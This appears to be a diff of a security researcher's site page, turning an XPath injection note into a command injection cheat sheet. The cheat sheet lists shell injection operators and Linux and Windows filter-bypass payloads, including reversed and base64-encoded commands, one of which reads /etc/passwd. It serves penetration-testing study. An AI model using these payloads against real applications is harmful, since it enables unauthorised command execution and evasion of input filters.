@@ -12,13 +12,13 @@
         <meta name="author" content="Tom Fieber">
       
       
-        <link rel="canonical" href="https://tomfieber.dev/resources/methodology/cheatsheets/xpath-injection/">
+        <link rel="canonical" href="https://tomfieber.dev/resources/methodology/cheatsheets/command-injection/">
       
       
-        <link rel="prev" href="../tls/">
+        <link rel="prev" href="../client-side-path-traversal/">
       
       
-        <link rel="next" href="../xss/">
+        <link rel="next" href="../cors/">
       
       
         
@@ -29,7 +29,7 @@
     
     
       
-        <title>XPath Injection - Tom Fieber (@pawpawhacks)</title>
+        <title>Command Injection - Tom Fieber (@pawpawhacks)</title>
       
     
     
@@ -152,7 +152,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#xpath-injection" class="md-skip">
+        <a href="#command-injection" class="md-skip">
           Skip to content
         </a>
       
@@ -185,7 +185,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              XPath Injection
+              Command Injection
             
           </span>
         </div>
@@ -806,10 +806,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../command-injection/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injection
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -825,6 +852,38 @@
   
 
       </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#injection-operators" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Injection Operators
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1198,19 +1257,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../xpath-injection/" class="md-nav__link">
         
   
   
@@ -1226,7 +1276,6 @@
   
 
       </a>
-      
     </li>
   
 
@@ -1469,6 +1518,25 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#injection-operators" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Injection Operators
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -1577,41 +1645,286 @@
   
 
 
-<h1 id="xpath-injection">XPath Injection</h1>
-<p>XPath injection is similar to SQL injection except for:</p>
-<ul>
-<li>It can only be used to read data, not to insert data</li>
-<li>It does not implement any access control, so if you find an injection point it's likely possible to get the whole document.</li>
-</ul>
+<h1 id="command-injection">Command Injection</h1>
+<h2 id="injection-operators">Injection Operators</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Injection Operator</strong></th>
+<th><strong>Injection Character</strong></th>
+<th><strong>URL-Encoded Character</strong></th>
+<th><strong>Executed Command</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Semicolon</td>
+<td><code>;</code></td>
+<td><code>%3b</code></td>
+<td>Both</td>
+</tr>
+<tr>
+<td>New Line</td>
+<td><code>\n</code></td>
+<td><code>%0a</code></td>
+<td>Both</td>
+</tr>
+<tr>
+<td>Background</td>
+<td><code>&amp;</code></td>
+<td><code>%26</code></td>
+<td>Both (second output generally shown first)</td>
+</tr>
+<tr>
+<td>Pipe</td>
+<td><code>\|</code></td>
+<td><code>%7c</code></td>
+<td>Both (only second output is shown)</td>
+</tr>
+<tr>
+<td>AND</td>
+<td><code>&amp;&amp;</code></td>
+<td><code>%26%26</code></td>
+<td>Both (only if first succeeds)</td>
+</tr>
+<tr>
+<td>OR</td>
+<td><code>\|</code></td>
+<td><code>%7c%7c</code></td>
+<td>Second (only if first fails)</td>
+</tr>
+<tr>
+<td>Sub-Shell</td>
+<td><code>``</code></td>
+<td><code>%60%60</code></td>
+<td>Both (Linux-only)</td>
+</tr>
+<tr>
+<td>Sub-Shell</td>
+<td><code>$()</code></td>
+<td><code>%24%28%29</code></td>
+<td>Both (Linux-only)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="linux">Linux</h1>
+<h2 id="filtered-character-bypass">Filtered Character Bypass</h2>
+<table>
+<thead>
+<tr>
+<th>Description</th>
+<th>Code</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Can be used to view all environment variables</td>
+<td><code>printenv</code></td>
+</tr>
+<tr>
+<td></td>
+<td><strong>Spaces</strong></td>
+</tr>
+<tr>
+<td>Using tabs instead of spaces</td>
+<td><code>%09</code></td>
+</tr>
+<tr>
+<td>Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. <code>$()</code>)</td>
+<td><code>${IFS}</code></td>
+</tr>
+<tr>
+<td>Commas will be replaced with spaces</td>
+<td><code>{ls,-la}</code></td>
+</tr>
+<tr>
+<td></td>
+<td><strong>Other Characters</strong></td>
+</tr>
+<tr>
+<td>Will be replaced with <code>/</code></td>
+<td><code>${PATH:0:1}</code></td>
+</tr>
+<tr>
+<td>Will be replaced with <code>;</code></td>
+<td><code>${LS_COLORS:10:1}</code></td>
+</tr>
+<tr>
+<td>Shift character by one (<code>[</code> -&gt; <code>\</code>)</td>
+<td><code>$(tr '!-}' '"-~'&lt;&lt;&lt;[)</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="blacklisted-command-bypass">Blacklisted Command Bypass</h2>
+<table>
+<thead>
+<tr>
+<th>Description</th>
+<th>Code</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td><strong>Character Insertion</strong></td>
+</tr>
+<tr>
+<td>Total must be even</td>
+<td><code>'</code> or <code>"</code></td>
+</tr>
+<tr>
+<td>Linux only</td>
+<td><code>$@</code> or <code>\</code></td>
+</tr>
+<tr>
+<td></td>
+<td><strong>Case Manipulation</strong></td>
+</tr>
+<tr>
+<td>Execute command regardless of cases</td>
+<td><code>$(tr "[A-Z]" "[a-z]"&lt;&lt;&lt;"WhOaMi")</code></td>
+</tr>
+<tr>
+<td>Another variation of the technique</td>
+<td><code>$(a="WhOaMi";printf %s "${a,,}")</code></td>
+</tr>
+<tr>
+<td></td>
+<td><strong>Reversed Commands</strong></td>
+</tr>
+<tr>
+<td>Reverse a string</td>
+<td><code>echo 'whoami' \| rev</code></td>
+</tr>
+<tr>
+<td>Execute reversed command</td>
+<td><code>$(rev&lt;&lt;&lt;'imaohw')</code></td>
+</tr>
+<tr>
+<td></td>
+<td><strong>Encoded Commands</strong></td>
+</tr>
+<tr>
+<td>Encode a string with base64</td>
+<td><code>echo -n 'cat /etc/passwd \| grep 33' \| base64</code></td>
+</tr>
+<tr>
+<td>Execute b64 encoded string</td>
+<td><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="windows">Windows</h1>
+<h2 id="filtered-character-bypass_1">Filtered Character Bypass</h2>
+<table>
+<thead>
+<tr>
+<th>Description</th>
+<th>Code</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Can be used to view all environment variables - (PowerShell)</td>
+<td><code>Get-ChildItem Env:</code></td>
+</tr>
+<tr>
+<td></td>
+<td><strong>Spaces</strong></td>
+</tr>
+<tr>
+<td>Using tabs instead of spaces</td>
+<td><code>%09</code></td>
+</tr>
+<tr>
+<td>Will be replaced with a space - (CMD)</td>
+<td><code>%PROGRAMFILES:~10,-5%</code></td>
+</tr>
+<tr>
+<td>Will be replaced with a space - (PowerShell)</td>
+<td><code>$env:PROGRAMFILES[10]</code></td>
+</tr>
+<tr>
+<td></td>
+<td><strong>Other Characters</strong></td>
+</tr>
+<tr>
+<td>Will be replaced with <code>\</code> - (CMD)</td>
+<td><code>%HOMEPATH:~0,-17%</code></td>
+</tr>
+<tr>
+<td>Will be replaced with <code>\</code> - (PowerShell)</td>
+<td><code>$env:HOMEPATH[0]</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="blacklisted-command-bypass_1">Blacklisted Command Bypass</h2>
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Character Insertion</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>'</code> or <code>"</code></td>
+<td>Total must be even</td>
+</tr>
+<tr>
+<td><code>^</code></td>
+<td>Windows only (CMD)</td>
+</tr>
+<tr>
+<td><strong>Case Manipulation</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>WhoAmi</code></td>
+<td>Simply send the character with odd cases</td>
+</tr>
+<tr>
+<td><strong>Reversed Commands</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>"whoami"[-1..-20] -join ''</code></td>
+<td>Reverse a string</td>
+</tr>
+<tr>
+<td><code>iex "$('imaohw'[-1..-20] -join '')"</code></td>
+<td>Execute reversed command</td>
+</tr>
+<tr>
+<td><strong>Encoded Commands</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code></td>
+<td>Encode a string with base64</td>
+</tr>
+<tr>
+<td><code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"</code></td>
+<td>Execute b64 encoded string</td>
+</tr>
+</tbody>
+</table>
 
 
-  <nav class="md-tags" >
-    
-      
-      
-      
-      
-        <span class="md-tag">xpath</span>
-      
-    
-      
-      
-      
-      
-        <span class="md-tag">injection</span>
-      
-    
-  </nav>
 
 
 
 
 
 
-
-
-  
-  
 
 
 
@@ -1643,7 +1956,7 @@
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
         
           
-          <a href="../tls/" class="md-footer__link md-footer__link--prev" aria-label="Previous: TLS Handshake">
+          <a href="../client-side-path-traversal/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Client-Side Path Traversal">
             <div class="md-footer__button md-icon">
               
               <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
@@ -1653,20 +1966,20 @@
                 Previous
               </span>
               <div class="md-ellipsis">
-                TLS Handshake
+                Client-Side Path Traversal
               </div>
             </div>
           </a>
         
         
           
-          <a href="../xss/" class="md-footer__link md-footer__link--next" aria-label="Next: Cross-Site Scripting (XSS)">
+          <a href="../cors/" class="md-footer__link md-footer__link--next" aria-label="Next: Cross Origin Resource Sharing (CORS)">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Next
               </span>
               <div class="md-ellipsis">
-                Cross-Site Scripting (XSS)
+                Cross Origin Resource Sharing (CORS)
               </div>
             </div>
             <div class="md-footer__button md-icon">
